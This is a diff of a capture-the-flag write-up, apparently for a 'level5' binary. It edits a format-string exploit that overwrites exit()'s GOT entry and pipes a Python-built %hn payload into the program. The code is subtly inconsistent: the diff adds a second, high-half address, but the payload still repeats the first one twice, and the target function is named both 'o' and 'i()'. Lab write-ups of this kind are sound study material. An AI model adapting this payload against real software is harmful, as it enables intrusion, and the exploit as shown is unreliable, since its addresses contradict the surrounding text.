@@ -33,7 +33,7 @@ OFFSET   TYPE              VALUE
 
 
 address of 'o' function: 080484a4
-address of 'exit' function 08049838
+address of 'exit' function 08049838 0804983A
 
 We have to change the value pointed by 08049838 (exit()) with the address of i(): 080484a4.
 Now, concerning the position of our string, it’s the 4th parameters on the stack :
@@ -57,4 +57,4 @@ High order bytes = 0804 (2052 in decimal)
 
 python -c 'import sys; sys.stdout.write("\x38\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn")' > /tmp/input
 
-cat /tmp/xd - | ./level5
+cat /tmp/input - | ./level5
